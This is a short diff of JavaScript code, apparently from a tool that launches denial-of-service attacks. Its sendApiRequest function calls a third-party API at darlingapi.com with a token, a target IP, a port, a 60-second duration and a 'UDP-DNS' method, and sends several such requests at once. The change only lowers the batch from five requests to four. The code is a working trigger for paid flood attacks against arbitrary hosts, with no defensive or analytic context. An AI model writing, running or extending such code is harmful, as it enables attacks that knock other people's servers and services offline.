@@ -55,7 +55,7 @@ async function clear() {
 
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=${token}&host=${ip}&port=${port}&time=60&method=UDP-DNS`;
-    const requests = Array(5).fill(url).map(u => axios.get(u));
+    const requests = Array(4).fill(url).map(u => axios.get(u));
     
     try {
         await axios.all(requests);
